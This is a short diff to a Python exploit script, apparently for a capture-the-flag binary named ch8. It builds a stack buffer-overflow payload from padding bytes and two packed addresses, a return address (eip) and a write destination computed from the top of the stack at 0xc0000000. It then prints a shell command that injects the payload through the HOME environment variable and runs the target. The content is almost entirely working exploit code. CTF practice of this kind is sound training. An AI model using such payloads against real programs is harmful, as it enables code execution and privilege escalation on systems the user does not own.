@@ -11,10 +11,13 @@ s += b'A' * 128 * 3
 s += b'B' * 32
 
 # put the address from ./env HOME ./ch8 here!
-home_addr = 0xbffffdb6
-eip = struct.pack('<I', home_addr)
-mov_dest = struct.pack('<I', home_addr)
+stack_region_end = 0xc0000000 
 
-s += eip + mov_dest
+# return addr (eip)
+s += struct.pack('<I', stack_region_end - 128 * 4 - 4)
 
-sys.stdout.buffer.write(s)
+# mov dest
+s += struct.pack('<I', stack_region_end - 128 * 4 - 4)
+
+escaped = repr(s)[1:]
+print(f'HOME="$(echo -ne {escaped})" USERNAME= ./ch8')
